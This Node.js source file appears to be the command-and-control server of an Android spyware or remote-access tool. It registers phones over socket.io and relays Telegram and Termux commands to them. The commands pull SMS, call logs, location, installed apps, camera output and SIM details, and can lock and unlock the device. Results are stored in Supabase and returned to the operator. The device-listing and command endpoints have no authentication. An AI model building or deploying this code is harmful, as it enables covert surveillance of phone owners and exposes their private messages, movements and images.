const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const { createClient } = require('@supabase/supabase-js');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

app.use(cors());
app.use(express.json());

// ==================== Environment Variables ====================
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY;
const SERVER_URL = process.env.SERVER_URL;

if (!TELEGRAM_TOKEN || !SUPABASE_URL || !SUPABASE_SERVICE_KEY) {
  console.error('Missing required environment variables');
  process.exit(1);
}

// ==================== Initialize Clients ====================
const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });

// Set webhook
if (SERVER_URL) {
  bot.setWebHook(`${SERVER_URL}/webhook`).then(() => {
    console.log('Webhook set');
  }).catch(console.error);
}

// ==================== Store connected clients ====================
const devices = new Map();           // deviceId -> socket (Android)
const termuxClients = new Map();     // socket.id -> { socket, deviceId }

// ==================== Helper: Store command result in Supabase ====================
async function storeResult(deviceId, command, result, type = null) {
  try {
    await supabase.from('command_results').insert([{ device_id: deviceId, command, result, type }]);
  } catch (err) {
    console.error('DB error:', err);
  }
}

// ==================== Helper: Update device last seen ====================
async function updateDeviceLastSeen(deviceId, info = null) {
  const update = { last_seen: new Date() };
  if (info) update.info = info;
  await supabase.from('devices').upsert({ id: deviceId, ...update }, { onConflict: 'id' });
}

// ==================== Telegram Keyboard ====================
const mainKeyboard = {
  reply_markup: {
    keyboard: [
      ['/sms', '/calllog', '/location'],
      ['/appusage', '/apps', '/camera'],
      ['/hotspot on', '/hotspot off', '/lock'],
      ['/unlock', '/sim', '/battery'],
      ['/device', '/charging', '/custom']
    ],
    resize_keyboard: true,
    one_time_keyboard: false
  }
};

// ==================== WebSocket ====================
io.on('connection', (socket) => {
  console.log('New client:', socket.id);

  // Android device registration
  socket.on('register', async (data) => {
    const { deviceId, info } = data;
    if (deviceId) {
      devices.set(deviceId, socket);
      socket.deviceId = deviceId;
      socket.isDevice = true;
      await updateDeviceLastSeen(deviceId, info);
      socket.emit('registered', { status: 'ok' });
      console.log(`Device registered: ${deviceId}`);
    }
  });

  // Termux client registration
  socket.on('termuxListen', (data) => {
    const { deviceId } = data;
    if (deviceId) {
      termuxClients.set(socket.id, { socket, deviceId });
      socket.isTermux = true;
      socket.listeningDevice = deviceId;
      console.log(`Termux client ${socket.id} listening to ${deviceId}`);
    }
  });

  // Command result from Android
  socket.on('commandResult', async (data) => {
    const { command, result, chatId, type } = data;
    const deviceId = socket.deviceId;
    if (!deviceId) return;

    await storeResult(deviceId, command, result, type);

    // Send to Telegram if from there
    if (chatId) {
      bot.sendMessage(chatId, result, { parse_mode: 'HTML' }).catch(console.error);
    }

    // Send to Termux clients listening to this device
    for (const [_, client] of termuxClients) {
      if (client.deviceId === deviceId) {
        client.socket.emit('commandResult', { command, result, type });
      }
    }
  });

  socket.on('disconnect', () => {
    if (socket.isDevice && socket.deviceId) devices.delete(socket.deviceId);
    if (socket.isTermux) termuxClients.delete(socket.id);
  });
});

// ==================== Telegram Webhook ====================
app.post('/webhook', (req, res) => {
  const update = req.body;
  if (update.message) {
    const chatId = update.message.chat.id;
    const text = update.message.text;

    if (text === '/start') {
      bot.sendMessage(chatId, 'Welcome! Select a command:', mainKeyboard).catch(console.error);
      return res.sendStatus(200);
    }

    const deviceId = chatId.toString();
    const deviceSocket = devices.get(deviceId);
    if (deviceSocket) {
      deviceSocket.emit('command', { command: text, chatId });
    } else {
      bot.sendMessage(chatId, '❌ Device is offline or not registered.').catch(console.error);
    }
    res.sendStatus(200);
  } else {
    res.sendStatus(200);
  }
});

// ==================== Termux Command Endpoint ====================
app.post('/sendCommand', async (req, res) => {
  const { deviceId, command } = req.body;
  if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });

  const deviceSocket = devices.get(deviceId);
  if (deviceSocket) {
    deviceSocket.emit('command', { command, chatId: null });
    res.json({ status: 'sent' });
  } else {
    const { data } = await supabase.from('devices').select('id').eq('id', deviceId).single();
    res.status(404).json({ error: data ? 'Device is offline' : 'Device not found' });
  }
});

// ==================== API for Termux Device List ====================
app.get('/api/devices', async (req, res) => {
  const { data, error } = await supabase.from('devices').select('*').order('last_seen', { ascending: false });
  if (error) return res.status(500).json({ error: error.message });
  res.json(data);
});

app.get('/', (req, res) => res.send('Monitor Server is running'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server on port ${PORT}`));